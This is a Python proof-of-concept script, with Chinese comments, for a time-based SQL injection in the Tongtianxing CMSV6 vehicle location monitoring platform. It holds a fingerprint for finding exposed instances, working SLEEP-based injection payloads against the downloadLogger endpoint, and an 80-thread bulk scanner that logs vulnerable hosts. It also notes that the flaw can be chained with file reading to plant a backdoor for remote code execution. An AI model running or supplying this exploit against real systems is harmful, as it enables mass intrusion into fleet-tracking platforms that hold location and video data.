# 通天星CMSV6车载定位监控平台 disable SQL注入漏洞
# body="/808gps/"
# 产品简介:通天星CMSV6车载定位监控平台拥有以位置服务、无线3G/4G视频传输、云存储服务为核心的研发团队，专注于为定位、无线视频终端产品提供平台服务，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。
# 漏洞概述:该漏洞是由于通天星CMSV6车载定位监控平台 /edu_security_officer/disable接口处未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。该漏洞可配合任意文件读取获取网站绝对路径写入后门文件进行远程代码执行。


import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
                 ██████╗███╗   ███╗███████╗██╗   ██╗ ██████╗ 
                ██╔════╝████╗ ████║██╔════╝██║   ██║██╔════╝ 
                ██║     ██╔████╔██║███████╗██║   ██║███████╗ 
                ██║     ██║╚██╔╝██║╚════██║╚██╗ ██╔╝██╔═══██╗
                ╚██████╗██║ ╚═╝ ██║███████║ ╚████╔╝ ╚██████╔╝
                ╚═════╝╚═╝     ╚═╝╚══════╝  ╚═══╝   ╚═════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                                                                                                                                    
    --author:Kucei  --Version:通天星CMSV6车载定位监控平台 disable SQL注入漏洞 
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<                                                  
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('通天星CMSV6车载定位监控平台_disable_SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = '/edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%281%29%29%29kOIi%29'
    url_payload2 = '/edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        payload1 = "/edu_security_officer/disable;downloadLogger.action?ids=1"
        payload2 = "/edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29"
        result1 = requests.get(url=target+payload1)
        result2 = requests.get(url=target+payload2)
        time1 = result1.elapsed.total_seconds()
        time2 = result2.elapsed.total_seconds()

        # print(response.status_code)
        # print(response.text)
        if time2 - time1 >= 4.8:            
            print( f"[+] {target} 存在漏洞！\n")
            with open('通天星CMSV6车载定位监控平台_disable_SQL.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")
if __name__ == '__main__':
    main()